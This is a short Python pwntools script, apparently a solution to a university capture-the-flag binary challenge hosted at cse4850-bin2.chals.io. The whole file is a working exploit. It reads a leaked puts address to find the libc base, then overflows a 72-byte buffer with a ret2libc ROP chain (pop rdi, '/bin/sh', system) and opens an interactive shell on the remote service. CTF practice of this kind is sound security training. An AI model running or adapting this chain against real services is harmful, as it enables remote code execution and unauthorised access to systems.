from pwn import * 

from pwn import *

binary = 'chal.bin'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
libc = ELF('./libc.so.6')
r = ROP(libc)

p = remote("cse4850-bin2.chals.io", 443, ssl=True, sni="cse4850-bin2.chals.io")

p.recvuntil(b'puts: ')

# save leak address
address = int(p.recvline(), 16)

#print(hex(address))
#print(hex(libc.sym['puts']))

offset = (address - libc.sym['puts'])
#print(hex(offset))

chain = cyclic(72)
chain += p64(offset + r.find_gadget(['ret'])[0])
chain += p64(offset + r.find_gadget(['pop rdi','ret'])[0])
chain += p64(offset + next(libc.search(b'/bin/sh')))
chain += p64(offset + libc.sym['system'])

p.recvuntil(b'input >>> ')
p.sendline(chain)
p.interactive()

